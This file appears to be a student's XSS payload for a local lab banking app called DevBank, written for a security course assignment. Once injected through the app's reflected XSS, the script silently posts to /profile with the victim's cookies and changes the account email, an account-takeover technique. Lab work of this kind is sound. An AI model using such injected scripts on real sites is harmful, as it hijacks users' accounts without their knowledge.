// FIT5003 A2 B.2: test payload for the local DevBank application.
// This file is loaded by the reflected XSS in /search.
(() => {
  const email = "B2TEST@devbank.local";

  fetch("/profile", {
    method: "POST",
    credentials: "same-origin",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams({ email, password: "" }),
  })
    .then((response) => {
      if (!response.ok) {
        throw new Error(`Profile update failed: ${response.status}`);
      }
      window.location.assign("/profile");
    })
    .catch((error) => console.error("B.2 payload failed:", error));
})();
